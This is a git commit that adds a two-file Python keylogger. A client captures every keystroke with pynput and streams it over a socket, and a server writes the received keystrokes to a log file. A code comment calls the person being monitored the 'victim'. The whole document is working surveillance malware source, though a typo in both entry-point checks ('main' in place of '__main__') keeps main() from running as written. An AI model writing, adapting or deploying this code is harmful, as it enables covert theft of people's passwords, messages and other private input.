761116f1b93458a76b8e51958d63f15a2ebae1af
DRIMIIX <90514319+DRIMMIIX@users.noreply.github.com>
2021-10-29 19:07:35 +0200

    Add files via upload

---
+++ client.py
@@ -0,0 +1,29 @@
+import socket
+from pynput.keyboard import Listener
+
+# def main
+def main():
+    with socket.socket() as s:
+        s.connect(("127.0.1.1", 6969))
+
+        # listen to keyboard
+        def listen_keyboard(key):
+            keydata = str(key)
+            keydata = keydata.replace("'", "")
+            # converting some keydatas because in the logfile we would get things like "Key.enter" instead of a new line
+            if keydata == 'Key.space':
+                keydata = ' '
+            if keydata == "Key.enter":
+                keydata = "\n"
+            elif "Key." in keydata:
+                keydata = ""
+            # encoding these data as bytes with the utf-8 format
+            s.send(bytes(keydata, "utf-8"))
+
+        # listen what the victim is typing
+        with Listener(on_press=listen_keyboard) as l:
+            l.join()
+
+
+if __name__ == "main":
+    main()
---
+++ main.py
@@ -0,0 +1,31 @@
+import socket
+import pynput
+
+
+# connecting
+def main():
+    # makes a socket and bind
+    with socket.socket() as s:
+        s.bind(("127.0.1.1", 6969))
+        s.listen()
+        print("|SERVER STARTS|")
+        conn, addr = s.accept()
+
+        # connecting with the conn
+        with conn:
+            print(f"|CONNECTED| with {addr}")
+            while True:
+                # receive the data and decode
+                keydata = conn.recv(1024).decode()
+
+                # write the decoded data in a file
+                with open("loggedtext.txt", "a") as f:
+                    f.write(keydata)
+                # breaks if theres no data
+                if not keydata:
+                    break
+
+
+# main
+if __name__ == "main":
+    main()
